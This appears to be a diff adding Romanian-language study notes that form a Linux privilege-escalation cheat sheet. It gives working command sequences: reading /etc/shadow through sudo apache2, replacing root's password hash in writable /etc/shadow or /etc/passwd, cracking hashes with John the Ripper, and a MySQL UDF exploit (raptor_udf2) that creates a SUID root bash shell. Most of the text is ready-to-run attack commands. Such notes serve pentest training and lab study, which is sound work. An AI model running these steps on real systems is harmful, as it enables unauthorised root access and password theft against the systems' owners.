@@ -1,0 +1,85 @@
+# Linux Privilege Escalation (PrivEsc)
+
+Privilege Escalation reprezintă exploatarea unei erori de configurare, vulnerabilități sau permisiuni neadecvate pentru a obține drepturi de administrator (`root` / `uid=0`) pornind de la un cont cu permisiuni reduse.
+
+---
+
+## 1. Recunoaștere Sudo & Arbitrary File Read
+
+### Inspectarea privilegiilor curente
+`sudo -l`
+* Listează binarele pe care utilizatorul curent le poate rula cu drepturi de root (definite în `/etc/sudoers`).
+* Referință rapidă pentru metode de evadare: https://gtfobins.github.io
+
+### Citirea fișierelor arbitrare prin Apache2
+Dacă utilizatorul poate executa `apache2` via `sudo`, parametrul `-f` (specificare fișier de configurare alternativ) forțează citirea fișierelor restricționate:
+`sudo apache2 -f /etc/shadow`
+* **Mecanism:** Apache deschide fișierul protejat ca root. Când întâlnește prima linie invalidă pentru sintaxa sa web, oprește execuția și afișează conținutul acelei linii în mesajul de eroare (`Syntax error ... Invalid command 'root:$6$...'`), dezvăluind hash-ul parolei pe ecran.
+
+---
+
+## 2. Weak File Permissions (/etc/shadow & /etc/passwd)
+
+### Generare Hash Linux compatibil (SHA-512 crypt)
+* Folosind OpenSSL: `openssl passwd -6 'ParolaAleasa'`
+* Folosind mkpasswd: `mkpasswd -m sha-512 'ParolaAleasa'`
+
+### Exploatare /etc/shadow modificabil (World-Writable)
+Fișierul are o structură strictă de 9 câmpuri separate prin `:`:
+`user:hash:lastchanged:min:max:warn:inactive:expire:reserved`
+
+* **Pași:**
+  1. Se generează hash-ul noii parole.
+  2. Se editează fișierul și se înlocuiește **exclusiv câmpul 2** (între primul și al doilea `:`), păstrând toți ceilalți delimitatori:
+     `root:$6$noul_hash...:18750:0:99999:7:::`
+  3. Autentificare: `su root` folosind noua parolă.
+
+### Exploatare /etc/passwd modificabil (World-Writable)
+* În linia standard `root:x:0:0:root:/root:/bin/bash`, caracterul `x` instruiește sistemul să caute hash-ul parolei în `/etc/shadow`.
+* **Bypass:** Înlocuirea directă a caracterului `x` cu un hash generat determină sistemul să verifice parola exclusiv din `/etc/passwd`, ignorând complet `/etc/shadow`:
+  `root:$6$noul_hash...:0:0:root:/root:/bin/bash`
+* **Notă de integritate:** Păstrează numele `root` intact; redenumirea contului împiedică utilitare precum `sudo` să funcționeze (`sudo: unknown user: root`).
+
+---
+
+## 3. Password Cracking (John the Ripper)
+
+* **Concept:** Hashing-ul este o operație unidirecțională (one-way). John the Ripper nu decriptează hash-uri, ci realizează un atac pe bază de dicționar (*dictionary attack*): calculează hash-ul fiecărui cuvânt din listă și compară rezultatul cu hash-ul țintă până la potrivire.
+
+### Pregătire Dicționar (Kali Linux)
+`sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`
+
+### Rulare Atac
+* Executare dicționar pe fișierul cu hash-ul extras:
+  `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+* Afișare credențiale identificate:
+  `john --show hash.txt`
+
+---
+
+## 4. MySQL UDF (User-Defined Functions) Exploitation
+
+Condiții preliminare: serviciul MySQL rulează ca `root` și permite autentificarea locală neparolată (`mysql -u root`).
+
+### 1. Compilare Exploit (raptor_udf2.c)
+* Compilare Position Independent Code (-fPIC):
+  `gcc -g -c raptor_udf2.c -fPIC`
+* Generare Shared Object (.so) cu SONAME definit:
+  `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
+
+### 2. Încărcare bibliotecă în MySQL
+* `use mysql;`
+* `create table foo(line blob);`
+* `insert into foo values(load_file('/tmp/raptor_udf2.so'));`
+* `select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
+* `create function do_system returns integer soname 'raptor_udf2.so';`
+
+### 3. Creare Shell SUID & Escaladare
+* În consola MySQL:
+  `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
+  `exit;`
+* În terminalul bash:
+  `/tmp/rootbash -p`
+* Curățare artefacte:
+  `rm /tmp/rootbash`
+  `exit`
